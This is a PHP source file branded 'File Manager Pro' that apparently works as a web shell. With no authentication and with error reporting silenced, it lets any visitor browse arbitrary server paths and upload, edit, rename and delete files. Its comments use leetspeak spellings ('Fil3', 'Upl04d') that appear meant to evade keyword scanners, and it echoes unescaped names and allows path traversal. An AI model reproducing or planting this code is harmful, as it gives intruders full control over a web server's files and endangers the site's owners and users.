<?php

@error_reporting(0);

// --- Path Handling ---
$folder = isset($_GET['folder']) ? $_GET['folder'] : '';
$folder = str_replace(["\0"], '', $folder); // sanitize
$fullPath = $folder ? realpath($folder) : getcwd();
if(!$fullPath || !is_dir($fullPath)) $fullPath = getcwd();
$serverPath = $fullPath;

// --- Breadcrumbs ---
function breadcrumbs($fullPath){
    $parts = explode(DIRECTORY_SEPARATOR, $fullPath);
    $build = '';
    $crumbs = [];
    foreach($parts as $p){
        if($p==='') continue;
        $build .= '/'.$p;
        $crumbs[] = "<a href='?folder=" . urlencode($build) . "'>$p</a>";
    }
    return '<div class="breadcrumb"><a href="?folder=/">/</a> ' . implode(' <span>/</span> ', $crumbs) . '</div>';
}

// --- Handle POST Actions ---
if($_SERVER['REQUEST_METHOD']==='POST'){
    // Create Fil3
    if(!empty($_POST['new_file'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
    // Create Folder
    if(!empty($_POST['new_folder'])) @mkdir($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_folder']), 0755);
    // Rename
    if(!empty($_POST['old_name']) && !empty($_POST['new_name'])) @rename($fullPath . DIRECTORY_SEPARATOR . $_POST['old_name'], $fullPath . DIRECTORY_SEPARATOR . $_POST['new_name']);
    // Save edited Fil3
    if(!empty($_POST['edit_file']) && isset($_POST['content'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . $_POST['edit_file'], $_POST['content']);
    // Upl04d Fil3
    if(!empty($_FILES['_upl']['tmp_name'])) @copy($_FILES['_upl']['tmp_name'], $fullPath . DIRECTORY_SEPARATOR . basename($_FILES['_upl']['name']));
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- Delete Fil3/Folders ---
if(isset($_GET['delete'])){
    $target = $fullPath . DIRECTORY_SEPARATOR . $_GET['delete'];
    if(is_dir($target)) @rmdir($target);
    elseif(is_file($target)) @unlink($target);
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- Directory Listing ---
$items = @scandir($fullPath);

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager Pro</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    padding: 20px;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    background: rgba(255, 255, 255, 0.95);
    border-radius: 15px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    overflow: hidden;
}

.header {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 30px;
    text-align: center;
}

.header h1 {
    font-size: 2.5em;
    margin-bottom: 10px;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
}

.header p {
    opacity: 0.9;
    font-size: 1.1em;
}

.content {
    padding: 30px;
}

.breadcrumb {
    background: #f8f9fa;
    padding: 15px 20px;
    border-radius: 8px;
    margin-bottom: 25px;
    font-size: 14px;
    border-left: 4px solid #667eea;
}

.breadcrumb a {
    color: #667eea;
    text-decoration: none;
    font-weight: 600;
    transition: color 0.3s;
}

.breadcrumb a:hover {
    color: #764ba2;
}

.breadcrumb span {
    color: #999;
    margin: 0 5px;
}

.server-path {
    background: #e9ecef;
    padding: 12px 20px;
    border-radius: 8px;
    margin-bottom: 25px;
    font-size: 13px;
    color: #495057;
    font-family: 'Courier New', monospace;
}

.actions-panel {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    gap: 15px;
    margin-bottom: 30px;
}

.action-card {
    background: white;
    border: 2px solid #e9ecef;
    border-radius: 10px;
    padding: 20px;
    transition: all 0.3s;
}

.action-card:hover {
    border-color: #667eea;
    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
}

.action-card h3 {
    color: #667eea;
    margin-bottom: 15px;
    font-size: 1.1em;
}

input[type="text"],
input[type="file"] {
    width: 100%;
    padding: 10px 15px;
    border: 2px solid #e9ecef;
    border-radius: 6px;
    font-size: 14px;
    transition: border-color 0.3s;
    margin-bottom: 10px;
}

input[type="text"]:focus,
input[type="file"]:focus {
    outline: none;
    border-color: #667eea;
}

button {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    padding: 10px 20px;
    border-radius: 6px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    width: 100%;
}

button:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
}

.file-list {
    list-style: none;
}

.file-item {
    background: white;
    border: 2px solid #e9ecef;
    border-radius: 10px;
    padding: 15px 20px;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: all 0.3s;
}

.file-item:hover {
    border-color: #667eea;
    box-shadow: 0 3px 10px rgba(102, 126, 234, 0.15);
}

.file-info {
    display: flex;
    align-items: center;
    flex: 1;
}

.file-icon {
    font-size: 24px;
    margin-right: 15px;
}

.file-name {
    font-weight: 600;
    color: #495057;
}

.file-actions {
    display: flex;
    gap: 10px;
    align-items: center;
}

.file-actions a,
.file-actions button {
    padding: 6px 12px;
    border-radius: 5px;
    text-decoration: none;
    font-size: 12px;
    font-weight: 600;
    transition: all 0.3s;
    width: auto;
}

.btn-open {
    background: #28a745;
    color: white;
}

.btn-open:hover {
    background: #218838;
}

.btn-edit {
    background: #ffc107;
    color: #333;
}

.btn-edit:hover {
    background: #e0a800;
}

.btn-delete {
    background: #dc3545;
    color: white;
}

.btn-delete:hover {
    background: #c82333;
}

.rename-form {
    display: flex;
    gap: 5px;
    align-items: center;
}

.rename-form input {
    width: 150px;
    padding: 6px 10px;
    margin: 0;
}

.rename-form button {
    background: #17a2b8;
    padding: 6px 12px;
    width: auto;
}

.rename-form button:hover {
    background: #138496;
}

.editor-panel {
    background: white;
    border: 2px solid #667eea;
    border-radius: 10px;
    padding: 25px;
    margin-top: 30px;
}

.editor-panel h3 {
    color: #667eea;
    margin-bottom: 20px;
    font-size: 1.3em;
}

textarea {
    width: 100%;
    height: 400px;
    padding: 15px;
    border: 2px solid #e9ecef;
    border-radius: 8px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    resize: vertical;
    margin-bottom: 15px;
}

textarea:focus {
    outline: none;
    border-color: #667eea;
}

@media (max-width: 768px) {
    .actions-panel {
        grid-template-columns: 1fr;
    }
    
    .file-item {
        flex-direction: column;
        align-items: flex-start;
    }
    
    .file-actions {
        margin-top: 10px;
        width: 100%;
        flex-wrap: wrap;
    }
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1> File Manager Pro</h1>
        <p>Advanced File Management System</p>
    </div>
    
    <div class="content">
        <?php echo breadcrumbs($fullPath); ?>
        
        <div class="server-path">
            <strong>Server Path:</strong> <?php echo htmlspecialchars($serverPath); ?>
        </div>
        
        <div class="actions-panel">
            <div class="action-card">
                <h3> Create New File</h3>
                <form method="post">
                    <input type="text" name="new_file" placeholder="Enter filename...">
                    <button type="submit">Create File</button>
                </form>
            </div>

            <div class="action-card">
                <h3> Create New Folder</h3>
                <form method="post">
                    <input type="text" name="new_folder" placeholder="Enter folder name...">
                    <button type="submit">Create Folder</button>
                </form>
            </div>

            <div class="action-card">
                <h3> Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="_upl">
                    <button type="submit">Upload File</button>
                </form>
            </div>
        </div>
        
        <ul class="file-list">
        <?php
        foreach($items as $i){
            if($i==='.' || $i==='..') continue;
            $full=$fullPath.DIRECTORY_SEPARATOR.$i;
            if(is_dir($full)){
                echo "<li class='file-item'>
                    <div class='file-info'>
                        <span class='file-icon'>📁</span>
                        <span class='file-name'>$i</span>
                    </div>
                    <div class='file-actions'>
                        <a href='?folder=".urlencode($full)."' class='btn-open'>Open</a>
                        <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' class='btn-delete' onclick='return confirm(\"Delete this folder?\")'>Delete</a>
                        <form class='rename-form' method='post'>
                            <input type='hidden' name='old_name' value='$i'>
                            <input type='text' name='new_name' placeholder='New name'>
                            <button type='submit'>Rename</button>
                        </form>
                    </div>
                    </li>";
            }else{
                echo "<li class='file-item'>
                    <div class='file-info'>
                        <span class='file-icon'>📄</span>
                        <span class='file-name'>$i</span>
                    </div>
                    <div class='file-actions'>
                        <a href='?folder=".urlencode($fullPath)."&edit=".urlencode($i)."' class='btn-edit'>Edit</a>
                        <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' class='btn-delete' onclick='return confirm(\"Delete this file?\")'>Delete</a>
                        <form class='rename-form' method='post'>
                            <input type='hidden' name='old_name' value='$i'>
                            <input type='text' name='new_name' placeholder='New name'>
                            <button type='submit'>Rename</button>
                        </form>
                    </div>
                    </li>";
            }
        }
        ?>
        </ul>
        
        <?php
        // --- Edit Fil3 ---
        if(isset($_GET['edit'])){
            $editFile=$fullPath.DIRECTORY_SEPARATOR.$_GET['edit'];
            if(is_file($editFile)){
                $content=htmlspecialchars(file_get_contents($editFile));
                echo "<div class='editor-panel'>
                        <h3> Editing: ".$_GET['edit']."</h3>
                        <form method='post'>
                            <textarea name='content'>$content</textarea>
                            <input type='hidden' name='edit_file' value='".htmlspecialchars($_GET['edit'])."'>
                            <button type='submit'> Save Changes</button>
                        </form>
                      </div>";
            }
        }
        ?>
    </div>
</div>
</body>
</html>